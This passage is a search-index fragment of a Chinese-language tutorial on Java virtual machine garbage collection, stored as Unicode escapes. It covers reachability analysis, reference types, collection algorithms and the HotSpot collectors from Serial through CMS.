\u5728\u4E0A\u8FF0\u4EE3\u7801\u4E2D\uFF0Ca \u4E0E b \u5F15\u7528\u7684\u5BF9\u8C61\u5B9E\u4F8B\u4E92\u76F8\u6301\u6709\u4E86\u5BF9\u8C61\u7684\u5F15\u7528\uFF0C\u56E0\u6B64\u5F53\u6211\u4EEC\u628A\u5BF9 a \u5BF9\u8C61\u4E0E b \u5BF9\u8C61\u7684\u5F15\u7528\u53BB\u9664\u4E4B\u540E\uFF0C\u7531\u4E8E\u4E24\u4E2A\u5BF9\u8C61\u8FD8\u5B58\u5728\u4E92\u76F8\u4E4B\u95F4\u7684\u5F15\u7528\uFF0C\u5BFC\u81F4\u4E24\u4E2A Test \u5BF9\u8C61\u65E0\u6CD5\u88AB\u56DE\u6536\u3002`},{header:"2. \u53EF\u8FBE\u6027\u5206\u6790\u7B97\u6CD5",slug:"_2-\u53EF\u8FBE\u6027\u5206\u6790\u7B97\u6CD5",content:`\u4EE5 GC Roots \u4E3A\u8D77\u59CB\u70B9\u8FDB\u884C\u641C\u7D22\uFF0C\u53EF\u8FBE\u7684\u5BF9\u8C61\u90FD\u662F\u5B58\u6D3B\u7684\uFF0C\u4E0D\u53EF\u8FBE\u7684\u5BF9\u8C61\u53EF\u88AB\u56DE\u6536\u3002
Java \u865A\u62DF\u673A\u4F7F\u7528\u8BE5\u7B97\u6CD5\u6765\u5224\u65AD\u5BF9\u8C61\u662F\u5426\u53EF\u88AB\u56DE\u6536\uFF0CGC Roots \u4E00\u822C\u5305\u542B\u4EE5\u4E0B\u5185\u5BB9\uFF1A \u865A\u62DF\u673A\u6808\u4E2D\u5C40\u90E8\u53D8\u91CF\u8868\u4E2D\u5F15\u7528\u7684\u5BF9\u8C61
\u672C\u5730\u65B9\u6CD5\u6808\u4E2D JNI \u4E2D\u5F15\u7528\u7684\u5BF9\u8C61
\u65B9\u6CD5\u533A\u4E2D\u7C7B\u9759\u6001\u5C5E\u6027\u5F15\u7528\u7684\u5BF9\u8C61
\u65B9\u6CD5\u533A\u4E2D\u7684\u5E38\u91CF\u5F15\u7528\u7684\u5BF9\u8C61`},{header:"3. \u65B9\u6CD5\u533A\u7684\u56DE\u6536",slug:"_3-\u65B9\u6CD5\u533A\u7684\u56DE\u6536",content:`\u56E0\u4E3A\u65B9\u6CD5\u533A\u4E3B\u8981\u5B58\u653E\u6C38\u4E45\u4EE3\u5BF9\u8C61\uFF0C\u800C\u6C38\u4E45\u4EE3\u5BF9\u8C61\u7684\u56DE\u6536\u7387\u6BD4\u65B0\u751F\u4EE3\u4F4E\u5F88\u591A\uFF0C\u6240\u4EE5\u5728\u65B9\u6CD5\u533A\u4E0A\u8FDB\u884C\u56DE\u6536\u6027\u4EF7\u6BD4\u4E0D\u9AD8\u3002
\u4E3B\u8981\u662F\u5BF9\u5E38\u91CF\u6C60\u7684\u56DE\u6536\u548C\u5BF9\u7C7B\u7684\u5378\u8F7D\u3002
\u4E3A\u4E86\u907F\u514D\u5185\u5B58\u6EA2\u51FA\uFF0C\u5728\u5927\u91CF\u4F7F\u7528\u53CD\u5C04\u548C\u52A8\u6001\u4EE3\u7406\u7684\u573A\u666F\u90FD\u9700\u8981\u865A\u62DF\u673A\u5177\u5907\u7C7B\u5378\u8F7D\u529F\u80FD\u3002
\u7C7B\u7684\u5378\u8F7D\u6761\u4EF6\u5F88\u591A\uFF0C\u9700\u8981\u6EE1\u8DB3\u4EE5\u4E0B\u4E09\u4E2A\u6761\u4EF6\uFF0C\u5E76\u4E14\u6EE1\u8DB3\u4E86\u6761\u4EF6\u4E5F\u4E0D\u4E00\u5B9A\u4F1A\u88AB\u5378\u8F7D\uFF1A \u8BE5\u7C7B\u6240\u6709\u7684\u5B9E\u4F8B\u90FD\u5DF2\u7ECF\u88AB\u56DE\u6536\uFF0C\u6B64\u65F6\u5806\u4E2D\u4E0D\u5B58\u5728\u8BE5\u7C7B\u7684\u4EFB\u4F55\u5B9E\u4F8B\u3002
\u52A0\u8F7D\u8BE5\u7C7B\u7684 ClassLoader \u5DF2\u7ECF\u88AB\u56DE\u6536\u3002
\u8BE5\u7C7B\u5BF9\u5E94\u7684 Class \u5BF9\u8C61\u6CA1\u6709\u5728\u4EFB\u4F55\u5730\u65B9\u88AB\u5F15\u7528\uFF0C\u4E5F\u5C31\u65E0\u6CD5\u5728\u4EFB\u4F55\u5730\u65B9\u901A\u8FC7\u53CD\u5C04\u8BBF\u95EE\u8BE5\u7C7B\u65B9\u6CD5\u3002`},{header:"4. finalize()",slug:"_4-finalize",content:`\u7C7B\u4F3C C++ \u7684\u6790\u6784\u51FD\u6570\uFF0C\u7528\u4E8E\u5173\u95ED\u5916\u90E8\u8D44\u6E90\u3002\u4F46\u662F try-finally \u7B49\u65B9\u5F0F\u53EF\u4EE5\u505A\u5F97\u66F4\u597D\uFF0C\u5E76\u4E14\u8BE5\u65B9\u6CD5\u8FD0\u884C\u4EE3\u4EF7\u5F88\u9AD8\uFF0C\u4E0D\u786E\u5B9A\u6027\u5927\uFF0C\u65E0\u6CD5\u4FDD\u8BC1\u5404\u4E2A\u5BF9\u8C61\u7684\u8C03\u7528\u987A\u5E8F\uFF0C\u56E0\u6B64\u6700\u597D\u4E0D\u8981\u4F7F\u7528\u3002
\u5F53\u4E00\u4E2A\u5BF9\u8C61\u53EF\u88AB\u56DE\u6536\u65F6\uFF0C\u5982\u679C\u9700\u8981\u6267\u884C\u8BE5\u5BF9\u8C61\u7684 finalize() \u65B9\u6CD5\uFF0C\u90A3\u4E48\u5C31\u6709\u53EF\u80FD\u5728\u8BE5\u65B9\u6CD5\u4E2D\u8BA9\u5BF9\u8C61\u91CD\u65B0\u88AB\u5F15\u7528\uFF0C\u4ECE\u800C\u5B9E\u73B0\u81EA\u6551\u3002\u81EA\u6551\u53EA\u80FD\u8FDB\u884C\u4E00\u6B21\uFF0C\u5982\u679C\u56DE\u6536\u7684\u5BF9\u8C61\u4E4B\u524D\u8C03\u7528\u4E86 finalize() \u65B9\u6CD5\u81EA\u6551\uFF0C\u540E\u9762\u56DE\u6536\u65F6\u4E0D\u4F1A\u518D\u8C03\u7528\u8BE5\u65B9\u6CD5\u3002`},{header:"\u5F15\u7528\u7C7B\u578B",slug:"\u5F15\u7528\u7C7B\u578B",content:`\u65E0\u8BBA\u662F\u901A\u8FC7\u5F15\u7528\u8BA1\u6570\u7B97\u6CD5\u5224\u65AD\u5BF9\u8C61\u7684\u5F15\u7528\u6570\u91CF\uFF0C\u8FD8\u662F\u901A\u8FC7\u53EF\u8FBE\u6027\u5206\u6790\u7B97\u6CD5\u5224\u65AD\u5BF9\u8C61\u662F\u5426\u53EF\u8FBE\uFF0C\u5224\u5B9A\u5BF9\u8C61\u662F\u5426\u53EF\u88AB\u56DE\u6536\u90FD\u4E0E\u5F15\u7528\u6709\u5173\u3002
Java \u63D0\u4F9B\u4E86\u56DB\u79CD\u5F3A\u5EA6\u4E0D\u540C\u7684\u5F15\u7528\u7C7B\u578B\u3002`},{header:"1. \u5F3A\u5F15\u7528",slug:"_1-\u5F3A\u5F15\u7528",content:`\u88AB\u5F3A\u5F15\u7528\u5173\u8054\u7684\u5BF9\u8C61\u4E0D\u4F1A\u88AB\u56DE\u6536\u3002
\u4F7F\u7528 new \u4E00\u4E2A\u65B0\u5BF9\u8C61\u7684\u65B9\u5F0F\u6765\u521B\u5EFA\u5F3A\u5F15\u7528\u3002
Object obj = new Object();`},{header:"2. \u8F6F\u5F15\u7528",slug:"_2-\u8F6F\u5F15\u7528",content:`\u88AB\u8F6F\u5F15\u7528\u5173\u8054\u7684\u5BF9\u8C61\u53EA\u6709\u5728\u5185\u5B58\u4E0D\u591F\u7684\u60C5\u51B5\u4E0B\u624D\u4F1A\u88AB\u56DE\u6536\u3002
\u4F7F\u7528 SoftReference \u7C7B\u6765\u521B\u5EFA\u8F6F\u5F15\u7528\u3002
Object obj = new Object();
SoftReference<Object> sf = new SoftReference<Object>(obj);
obj = null; // \u4F7F\u5BF9\u8C61\u53EA\u88AB\u8F6F\u5F15\u7528\u5173\u8054`},{header:"3. \u5F31\u5F15\u7528",slug:"_3-\u5F31\u5F15\u7528",content:`\u88AB\u5F31\u5F15\u7528\u5173\u8054\u7684\u5BF9\u8C61\u4E00\u5B9A\u4F1A\u88AB\u56DE\u6536\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5B83\u53EA\u80FD\u5B58\u6D3B\u5230\u4E0B\u4E00\u6B21\u5783\u573E\u56DE\u6536\u53D1\u751F\u4E4B\u524D\u3002
\u4F7F\u7528 WeakReference \u7C7B\u6765\u521B\u5EFA\u5F31\u5F15\u7528\u3002
Object obj = new Object();
WeakReference<Object> wf = new WeakReference<Object>(obj);
obj = null;`},{header:"4. \u865A\u5F15\u7528",slug:"_4-\u865A\u5F15\u7528",content:`\u53C8\u79F0\u4E3A\u5E7D\u7075\u5F15\u7528\u6216\u8005\u5E7B\u5F71\u5F15\u7528\uFF0C\u4E00\u4E2A\u5BF9\u8C61\u662F\u5426\u6709\u865A\u5F15\u7528\u7684\u5B58\u5728\uFF0C\u4E0D\u4F1A\u5BF9\u5176\u751F\u5B58\u65F6\u95F4\u9020\u6210\u5F71\u54CD\uFF0C\u4E5F\u65E0\u6CD5\u901A\u8FC7\u865A\u5F15\u7528\u5F97\u5230\u4E00\u4E2A\u5BF9\u8C61\u3002
\u4E3A\u4E00\u4E2A\u5BF9\u8C61\u8BBE\u7F6E\u865A\u5F15\u7528\u7684\u552F\u4E00\u76EE\u7684\u662F\u80FD\u5728\u8FD9\u4E2A\u5BF9\u8C61\u88AB\u56DE\u6536\u65F6\u6536\u5230\u4E00\u4E2A\u7CFB\u7EDF\u901A\u77E5\u3002
\u4F7F\u7528 PhantomReference \u6765\u521B\u5EFA\u865A\u5F15\u7528\u3002
Object obj = new Object();
PhantomReference<Object> pf = new PhantomReference<Object>(obj, null);
obj = null;`},{header:"\u5783\u573E\u6536\u96C6\u7B97\u6CD5",slug:"\u5783\u573E\u6536\u96C6\u7B97\u6CD5",content:""},{header:"1. \u6807\u8BB0 - \u6E05\u9664",slug:"_1-\u6807\u8BB0-\u6E05\u9664",content:`\u5728\u6807\u8BB0\u9636\u6BB5\uFF0C\u7A0B\u5E8F\u4F1A\u68C0\u67E5\u6BCF\u4E2A\u5BF9\u8C61\u662F\u5426\u4E3A\u6D3B\u52A8\u5BF9\u8C61\uFF0C\u5982\u679C\u662F\u6D3B\u52A8\u5BF9\u8C61\uFF0C\u5219\u7A0B\u5E8F\u4F1A\u5728\u5BF9\u8C61\u5934\u90E8\u6253\u4E0A\u6807\u8BB0\u3002
\u5728\u6E05\u9664\u9636\u6BB5\uFF0C\u4F1A\u8FDB\u884C\u5BF9\u8C61\u56DE\u6536\u5E76\u53D6\u6D88\u6807\u5FD7\u4F4D\uFF0C\u53E6\u5916\uFF0C\u8FD8\u4F1A\u5224\u65AD\u56DE\u6536\u540E\u7684\u5206\u5757\u4E0E\u524D\u4E00\u4E2A\u7A7A\u95F2\u5206\u5757\u662F\u5426\u8FDE\u7EED\uFF0C\u82E5\u8FDE\u7EED\uFF0C\u4F1A\u5408\u5E76\u8FD9\u4E24\u4E2A\u5206\u5757\u3002\u56DE\u6536\u5BF9\u8C61\u5C31\u662F\u628A\u5BF9\u8C61\u4F5C\u4E3A\u5206\u5757\uFF0C\u8FDE\u63A5\u5230\u88AB\u79F0\u4E3A \u201C\u7A7A\u95F2\u94FE\u8868\u201D \u7684\u5355\u5411\u94FE\u8868\uFF0C\u4E4B\u540E\u8FDB\u884C\u5206\u914D\u65F6\u53EA\u9700\u8981\u904D\u5386\u8FD9\u4E2A\u7A7A\u95F2\u94FE\u8868\uFF0C\u5C31\u53EF\u4EE5\u627E\u5230\u5206\u5757\u3002
\u5728\u5206\u914D\u65F6\uFF0C\u7A0B\u5E8F\u4F1A\u641C\u7D22\u7A7A\u95F2\u94FE\u8868\u5BFB\u627E\u7A7A\u95F4\u5927\u4E8E\u7B49\u4E8E\u65B0\u5BF9\u8C61\u5927\u5C0F size \u7684\u5757 block\u3002\u5982\u679C\u5B83\u627E\u5230\u7684\u5757\u7B49\u4E8E size\uFF0C\u4F1A\u76F4\u63A5\u8FD4\u56DE\u8FD9\u4E2A\u5206\u5757\uFF1B\u5982\u679C\u627E\u5230\u7684\u5757\u5927\u4E8E size\uFF0C\u4F1A\u5C06\u5757\u5206\u5272\u6210\u5927\u5C0F\u4E3A size \u4E0E (block - size) \u7684\u4E24\u90E8\u5206\uFF0C\u8FD4\u56DE\u5927\u5C0F\u4E3A size \u7684\u5206\u5757\uFF0C\u5E76\u628A\u5927\u5C0F\u4E3A (block - size) \u7684\u5757\u8FD4\u56DE\u7ED9\u7A7A\u95F2\u94FE\u8868\u3002
\u4E0D\u8DB3\uFF1A \u6807\u8BB0\u548C\u6E05\u9664\u8FC7\u7A0B\u6548\u7387\u90FD\u4E0D\u9AD8\uFF1B
\u4F1A\u4EA7\u751F\u5927\u91CF\u4E0D\u8FDE\u7EED\u7684\u5185\u5B58\u788E\u7247\uFF0C\u5BFC\u81F4\u65E0\u6CD5\u7ED9\u5927\u5BF9\u8C61\u5206\u914D\u5185\u5B58\u3002`},{header:"2. \u6807\u8BB0 - \u6574\u7406",slug:"_2-\u6807\u8BB0-\u6574\u7406",content:`\u8BA9\u6240\u6709\u5B58\u6D3B\u7684\u5BF9\u8C61\u90FD\u5411\u4E00\u7AEF\u79FB\u52A8\uFF0C\u7136\u540E\u76F4\u63A5\u6E05\u7406\u6389\u7AEF\u8FB9\u754C\u4EE5\u5916\u7684\u5185\u5B58\u3002
\u4F18\u70B9: \u4E0D\u4F1A\u4EA7\u751F\u5185\u5B58\u788E\u7247 \u4E0D\u8DB3: \u9700\u8981\u79FB\u52A8\u5927\u91CF\u5BF9\u8C61\uFF0C\u5904\u7406\u6548\u7387\u6BD4\u8F83\u4F4E\u3002`},{header:"3. \u590D\u5236",slug:"_3-\u590D\u5236",content:`\u5C06\u5185\u5B58\u5212\u5206\u4E3A\u5927\u5C0F\u76F8\u7B49\u7684\u4E24\u5757\uFF0C\u6BCF\u6B21\u53EA\u4F7F\u7528\u5176\u4E2D\u4E00\u5757\uFF0C\u5F53\u8FD9\u4E00\u5757\u5185\u5B58\u7528\u5B8C\u4E86\u5C31\u5C06\u8FD8\u5B58\u6D3B\u7684\u5BF9\u8C61\u590D\u5236\u5230\u53E6\u4E00\u5757\u4E0A\u9762\uFF0C\u7136\u540E\u518D\u628A\u4F7F\u7528\u8FC7\u7684\u5185\u5B58\u7A7A\u95F4\u8FDB\u884C\u4E00\u6B21\u6E05\u7406\u3002
\u4E3B\u8981\u4E0D\u8DB3\u662F\u53EA\u4F7F\u7528\u4E86\u5185\u5B58\u7684\u4E00\u534A\u3002
\u73B0\u5728\u7684\u5546\u4E1A\u865A\u62DF\u673A\u90FD\u91C7\u7528\u8FD9\u79CD\u6536\u96C6\u7B97\u6CD5\u56DE\u6536\u65B0\u751F\u4EE3\uFF0C\u4F46\u662F\u5E76\u4E0D\u662F\u5212\u5206\u4E3A\u5927\u5C0F\u76F8\u7B49\u7684\u4E24\u5757\uFF0C\u800C\u662F\u4E00\u5757\u8F83\u5927\u7684 Eden \u7A7A\u95F4\u548C\u4E24\u5757\u8F83\u5C0F\u7684 Survivor \u7A7A\u95F4\uFF0C\u6BCF\u6B21\u4F7F\u7528 Eden \u548C\u5176\u4E2D\u4E00\u5757 Survivor\u3002\u5728\u56DE\u6536\u65F6\uFF0C\u5C06 Eden \u548C Survivor \u4E2D\u8FD8\u5B58\u6D3B\u7740\u7684\u5BF9\u8C61\u5168\u90E8\u590D\u5236\u5230\u53E6\u4E00\u5757 Survivor \u4E0A\uFF0C\u6700\u540E\u6E05\u7406 Eden \u548C\u4F7F\u7528\u8FC7\u7684\u90A3\u4E00\u5757 Survivor\u3002
HotSpot \u865A\u62DF\u673A\u7684 Eden \u548C Survivor \u5927\u5C0F\u6BD4\u4F8B\u9ED8\u8BA4\u4E3A 8:1\uFF0C\u4FDD\u8BC1\u4E86\u5185\u5B58\u7684\u5229\u7528\u7387\u8FBE\u5230 90%\u3002\u5982\u679C\u6BCF\u6B21\u56DE\u6536\u6709\u591A\u4E8E 10% \u7684\u5BF9\u8C61\u5B58\u6D3B\uFF0C\u90A3\u4E48\u4E00\u5757 Survivor \u5C31\u4E0D\u591F\u7528\u4E86\uFF0C\u6B64\u65F6\u9700\u8981\u4F9D\u8D56\u4E8E\u8001\u5E74\u4EE3\u8FDB\u884C\u7A7A\u95F4\u5206\u914D\u62C5\u4FDD\uFF0C\u4E5F\u5C31\u662F\u501F\u7528\u8001\u5E74\u4EE3\u7684\u7A7A\u95F4\u5B58\u50A8\u653E\u4E0D\u4E0B\u7684\u5BF9\u8C61\u3002`},{header:"4. \u5206\u4EE3\u6536\u96C6",slug:"_4-\u5206\u4EE3\u6536\u96C6",content:`\u73B0\u5728\u7684\u5546\u4E1A\u865A\u62DF\u673A\u91C7\u7528\u5206\u4EE3\u6536\u96C6\u7B97\u6CD5\uFF0C\u5B83\u6839\u636E\u5BF9\u8C61\u5B58\u6D3B\u5468\u671F\u5C06\u5185\u5B58\u5212\u5206\u4E3A\u51E0\u5757\uFF0C\u4E0D\u540C\u5757\u91C7\u7528\u9002\u5F53\u7684\u6536\u96C6\u7B97\u6CD5\u3002
\u4E00\u822C\u5C06\u5806\u5206\u4E3A\u65B0\u751F\u4EE3\u548C\u8001\u5E74\u4EE3\u3002 \u65B0\u751F\u4EE3\u4F7F\u7528\uFF1A\u590D\u5236\u7B97\u6CD5
\u8001\u5E74\u4EE3\u4F7F\u7528\uFF1A\u6807\u8BB0 - \u6E05\u9664 \u6216\u8005 \u6807\u8BB0 - \u6574\u7406 \u7B97\u6CD5`},{header:"\u5783\u573E\u6536\u96C6\u5668",slug:"\u5783\u573E\u6536\u96C6\u5668",content:`\u4EE5\u4E0A\u662F HotSpot \u865A\u62DF\u673A\u4E2D\u7684 7 \u4E2A\u5783\u573E\u6536\u96C6\u5668\uFF0C\u8FDE\u7EBF\u8868\u793A\u5783\u573E\u6536\u96C6\u5668\u53EF\u4EE5\u914D\u5408\u4F7F\u7528\u3002 \u5355\u7EBF\u7A0B\u4E0E\u591A\u7EBF\u7A0B\uFF1A\u5355\u7EBF\u7A0B\u6307\u7684\u662F\u5783\u573E\u6536\u96C6\u5668\u53EA\u4F7F\u7528\u4E00\u4E2A\u7EBF\u7A0B\uFF0C\u800C\u591A\u7EBF\u7A0B\u4F7F\u7528\u591A\u4E2A\u7EBF\u7A0B\uFF1B
\u4E32\u884C\u4E0E\u5E76\u884C\uFF1A\u4E32\u884C\u6307\u7684\u662F\u5783\u573E\u6536\u96C6\u5668\u4E0E\u7528\u6237\u7A0B\u5E8F\u4EA4\u66FF\u6267\u884C\uFF0C\u8FD9\u610F\u5473\u7740\u5728\u6267\u884C\u5783\u573E\u6536\u96C6\u7684\u65F6\u5019\u9700\u8981\u505C\u987F\u7528\u6237\u7A0B\u5E8F\uFF1B\u5E76\u884C\u6307\u7684\u662F\u5783\u573E\u6536\u96C6\u5668\u548C\u7528\u6237\u7A0B\u5E8F\u540C\u65F6\u6267\u884C\u3002\u9664\u4E86 CMS \u548C G1 \u4E4B\u5916\uFF0C\u5176\u5B83\u5783\u573E\u6536\u96C6\u5668\u90FD\u662F\u4EE5\u4E32\u884C\u7684\u65B9\u5F0F\u6267\u884C\u3002`},{header:"1. Serial \u6536\u96C6\u5668",slug:"_1-serial-\u6536\u96C6\u5668",content:`Serial \u7FFB\u8BD1\u4E3A\u4E32\u884C\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5B83\u4EE5\u4E32\u884C\u7684\u65B9\u5F0F\u6267\u884C\u3002
\u5B83\u662F\u5355\u7EBF\u7A0B\u7684\u6536\u96C6\u5668\uFF0C\u53EA\u4F1A\u4F7F\u7528\u4E00\u4E2A\u7EBF\u7A0B\u8FDB\u884C\u5783\u573E\u6536\u96C6\u5DE5\u4F5C\u3002
\u5B83\u7684\u4F18\u70B9\u662F\u7B80\u5355\u9AD8\u6548\uFF0C\u5728\u5355\u4E2A CPU \u73AF\u5883\u4E0B\uFF0C\u7531\u4E8E\u6CA1\u6709\u7EBF\u7A0B\u4EA4\u4E92\u7684\u5F00\u9500\uFF0C\u56E0\u6B64\u62E5\u6709\u6700\u9AD8\u7684\u5355\u7EBF\u7A0B\u6536\u96C6\u6548\u7387\u3002
\u5B83\u662F Client \u573A\u666F\u4E0B\u7684\u9ED8\u8BA4\u65B0\u751F\u4EE3\u6536\u96C6\u5668\uFF0C\u56E0\u4E3A\u5728\u8BE5\u573A\u666F\u4E0B\u5185\u5B58\u4E00\u822C\u6765\u8BF4\u4E0D\u4F1A\u5F88\u5927\u3002\u5B83\u6536\u96C6\u4E00\u4E24\u767E\u5146\u5783\u573E\u7684\u505C\u987F\u65F6\u95F4\u53EF\u4EE5\u63A7\u5236\u5728\u4E00\u767E\u591A\u6BEB\u79D2\u4EE5\u5185\uFF0C\u53EA\u8981\u4E0D\u662F\u592A\u9891\u7E41\uFF0C\u8FD9\u70B9\u505C\u987F\u65F6\u95F4\u662F\u53EF\u4EE5\u63A5\u53D7\u7684\u3002`},{header:"2. ParNew \u6536\u96C6\u5668",slug:"_2-parnew-\u6536\u96C6\u5668",content:`\u5B83\u662F Serial \u6536\u96C6\u5668\u7684\u591A\u7EBF\u7A0B\u7248\u672C\u3002
\u5B83\u662F Server \u573A\u666F\u4E0B\u9ED8\u8BA4\u7684\u65B0\u751F\u4EE3\u6536\u96C6\u5668\uFF0C\u9664\u4E86\u6027\u80FD\u539F\u56E0\u5916\uFF0C\u4E3B\u8981\u662F\u56E0\u4E3A\u9664\u4E86 Serial \u6536\u96C6\u5668\uFF0C\u53EA\u6709\u5B83\u80FD\u4E0E CMS \u6536\u96C6\u5668\u914D\u5408\u4F7F\u7528\u3002`},{header:"3. Parallel Scavenge \u6536\u96C6\u5668",slug:"_3-parallel-scavenge-\u6536\u96C6\u5668",content:`\u4E0E ParNew \u4E00\u6837\u662F\u591A\u7EBF\u7A0B\u6536\u96C6\u5668\u3002
\u5176\u5B83\u6536\u96C6\u5668\u76EE\u6807\u662F\u5C3D\u53EF\u80FD\u7F29\u77ED\u5783\u573E\u6536\u96C6\u65F6\u7528\u6237\u7EBF\u7A0B\u7684\u505C\u987F\u65F6\u95F4\uFF0C\u800C\u5B83\u7684\u76EE\u6807\u662F\u8FBE\u5230\u4E00\u4E2A\u53EF\u63A7\u5236\u7684\u541E\u5410\u91CF\uFF0C\u56E0\u6B64\u5B83\u88AB\u79F0\u4E3A\u201C\u541E\u5410\u91CF\u4F18\u5148\u201D\u6536\u96C6\u5668\u3002\u8FD9\u91CC\u7684\u541E\u5410\u91CF\u6307 CPU \u7528\u4E8E\u8FD0\u884C\u7528\u6237\u7A0B\u5E8F\u7684\u65F6\u95F4\u5360\u603B\u65F6\u95F4\u7684\u6BD4\u503C\u3002
\u505C\u987F\u65F6\u95F4\u8D8A\u77ED\u5C31\u8D8A\u9002\u5408\u9700\u8981\u4E0E\u7528\u6237\u4EA4\u4E92\u7684\u7A0B\u5E8F\uFF0C\u826F\u597D\u7684\u54CD\u5E94\u901F\u5EA6\u80FD\u63D0\u5347\u7528\u6237\u4F53\u9A8C\u3002\u800C\u9AD8\u541E\u5410\u91CF\u5219\u53EF\u4EE5\u9AD8\u6548\u7387\u5730\u5229\u7528 CPU \u65F6\u95F4\uFF0C\u5C3D\u5FEB\u5B8C\u6210\u7A0B\u5E8F\u7684\u8FD0\u7B97\u4EFB\u52A1\uFF0C\u9002\u5408\u5728\u540E\u53F0\u8FD0\u7B97\u800C\u4E0D\u9700\u8981\u592A\u591A\u4EA4\u4E92\u7684\u4EFB\u52A1\u3002
\u7F29\u77ED\u505C\u987F\u65F6\u95F4\u662F\u4EE5\u727A\u7272\u541E\u5410\u91CF\u548C\u65B0\u751F\u4EE3\u7A7A\u95F4\u6765\u6362\u53D6\u7684\uFF1A\u65B0\u751F\u4EE3\u7A7A\u95F4\u53D8\u5C0F\uFF0C\u5783\u573E\u56DE\u6536\u53D8\u5F97\u9891\u7E41\uFF0C\u5BFC\u81F4\u541E\u5410\u91CF\u4E0B\u964D\u3002
\u53EF\u4EE5\u901A\u8FC7\u4E00\u4E2A\u5F00\u5173\u53C2\u6570\u6253\u5F00 GC \u81EA\u9002\u5E94\u7684\u8C03\u8282\u7B56\u7565\uFF08GC Ergonomics\uFF09\uFF0C\u5C31\u4E0D\u9700\u8981\u624B\u5DE5\u6307\u5B9A\u65B0\u751F\u4EE3\u7684\u5927\u5C0F\uFF08-Xmn\uFF09\u3001Eden \u548C Survivor \u533A\u7684\u6BD4\u4F8B\u3001\u664B\u5347\u8001\u5E74\u4EE3\u5BF9\u8C61\u5E74\u9F84\u7B49\u7EC6\u8282\u53C2\u6570\u4E86\u3002\u865A\u62DF\u673A\u4F1A\u6839\u636E\u5F53\u524D\u7CFB\u7EDF\u7684\u8FD0\u884C\u60C5\u51B5\u6536\u96C6\u6027\u80FD\u76D1\u63A7\u4FE1\u606F\uFF0C\u52A8\u6001\u8C03\u6574\u8FD9\u4E9B\u53C2\u6570\u4EE5\u63D0\u4F9B\u6700\u5408\u9002\u7684\u505C\u987F\u65F6\u95F4\u6216\u8005\u6700\u5927\u7684\u541E\u5410\u91CF\u3002`},{header:"4. Serial Old \u6536\u96C6\u5668",slug:"_4-serial-old-\u6536\u96C6\u5668",content:`\u662F Serial \u6536\u96C6\u5668\u7684\u8001\u5E74\u4EE3\u7248\u672C\uFF0C\u4E5F\u662F\u7ED9 Client \u573A\u666F\u4E0B\u7684\u865A\u62DF\u673A\u4F7F\u7528\u3002\u5982\u679C\u7528\u5728 Server \u573A\u666F\u4E0B\uFF0C\u5B83\u6709\u4E24\u5927\u7528\u9014\uFF1A \u5728 JDK 1.5 \u4EE5\u53CA\u4E4B\u524D\u7248\u672C\uFF08Parallel Old \u8BDE\u751F\u4EE5\u524D\uFF09\u4E2D\u4E0E Parallel Scavenge \u6536\u96C6\u5668\u642D\u914D\u4F7F\u7528\u3002
\u4F5C\u4E3A CMS \u6536\u96C6\u5668\u7684\u540E\u5907\u9884\u6848\uFF0C\u5728\u5E76\u53D1\u6536\u96C6\u53D1\u751F Concurrent Mode Failure \u65F6\u4F7F\u7528\u3002`},{header:"5. Parallel Old \u6536\u96C6\u5668",slug:"_5-parallel-old-\u6536\u96C6\u5668",content:`\u662F Parallel Scavenge \u6536\u96C6\u5668\u7684\u8001\u5E74\u4EE3\u7248\u672C\u3002
\u5728\u6CE8\u91CD\u541E\u5410\u91CF\u4EE5\u53CA CPU \u8D44\u6E90\u654F\u611F\u7684\u573A\u5408\uFF0C\u90FD\u53EF\u4EE5\u4F18\u5148\u8003\u8651 Parallel Scavenge \u52A0 Parallel Old \u6536\u96C6\u5668\u3002`},{header:"6. CMS \u6536\u96C6\u5668",slug:"_6-cms-\u6536\u96C6\u5668",content:`CMS\uFF08Concurrent Mark Sweep\uFF09\uFF0CMark Sweep \u6307\u7684\u662F\u6807\u8BB0 - \u6E05\u9664\u7B97\u6CD5\u3002
\u5206\u4E3A\u4EE5\u4E0B\u56DB\u4E2A\u6D41\u7A0B\uFF1A \u521D\u59CB\u6807\u8BB0\uFF1A\u4EC5\u4EC5\u53EA\u662F\u6807\u8BB0\u4E00\u4E0B GC Roots \u80FD\u76F4\u63A5\u5173\u8054\u5230\u7684\u5BF9\u8C61\uFF0C\u901F\u5EA6\u5F88\u5FEB\uFF0C\u9700\u8981\u505C\u987F\u3002
\u5E76\u53D1\u6807\u8BB0\uFF1A\u8FDB\u884C GC Roots Tracing \u7684\u8FC7\u7A0B\uFF0C\u5B83\u5728\u6574\u4E2A\u56DE\u6536\u8FC7\u7A0B\u4E2D\u8017\u65F6\u6700\u957F\uFF0C\u4E0D\u9700\u8981\u505C\u987F\u3002
\u91CD\u65B0\u6807\u8BB0\uFF1A\u4E3A\u4E86\u4FEE\u6B63\u5E76\u53D1\u6807\u8BB0\u671F\u95F4\u56E0\u7528\u6237\u7A0B\u5E8F\u7EE7\u7EED\u8FD0\u4F5C\u800C\u5BFC\u81F4\u6807\u8BB0\u4EA7\u751F\u53D8\u52A8\u7684\u90A3\u4E00\u90E8\u5206\u5BF9\u8C61\u7684\u6807\u8BB0\u8BB0\u5F55\uFF0C\u9700\u8981\u505C\u987F\u3002
\u5E76\u53D1\u6E05\u9664\uFF1A\u4E0D\u9700\u8981\u505C\u987F\u3002 \u5728\u6574\u4E2A\u8FC7\u7A0B\u4E2D\u8017\u65F6\u6700\u957F\u7684\u5E76\u53D1\u6807\u8BB0\u548C\u5E76\u53D1\u6E05\u9664\u8FC7\u7A0B\u4E2D\uFF0C\u6536\u96C6\u5668\u7EBF\u7A0B\u90FD\u53EF\u4EE5\u4E0E\u7528\u6237\u7EBF\u7A0B\u4E00\u8D77\u5DE5\u4F5C\uFF0C\u4E0D\u9700\u8981\u8FDB\u884C\u505C\u987F\u3002
\u5177\u6709\u4EE5\u4E0B\u7F3A\u70B9\uFF1A \u541E\u5410\u91CF\u4F4E\uFF1A\u4F4E\u505C\u987F\u65F6\u95F4\u662F\u4EE5\u727A\u7272\u541E\u5410\u91CF\u4E3A\u4EE3\u4EF7\u7684\uFF0C\u5BFC\u81F4 CPU \u5229\u7528\u7387\u4E0D\u591F\u9AD8\u3002
